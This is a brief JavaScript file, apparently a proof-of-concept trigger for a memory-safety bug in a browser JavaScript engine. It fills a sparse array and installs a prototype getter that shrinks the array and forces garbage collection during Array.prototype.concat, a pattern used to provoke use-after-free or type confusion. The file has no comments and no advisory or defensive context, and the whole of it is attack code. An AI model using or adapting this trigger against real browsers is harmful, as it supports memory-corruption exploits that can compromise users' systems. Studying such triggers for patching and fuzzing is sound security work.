function gc()
{
    for(var i=0;i<((1024 * 1024)/0x10);i++)
    {
        var a= new String();
    }
}

array    = new Array(10)
array[0] = 1.1
array[2] = 2.1
array[3] = 3.1

var proto = {};
array.__proto__ = proto;

Object.defineProperty(
  proto, 1, {
    get() {
      array.length = 1;
      gc();
      return "value from proto";
    },
    set(new_value) { }
});

Array.prototype.concat.call(array);
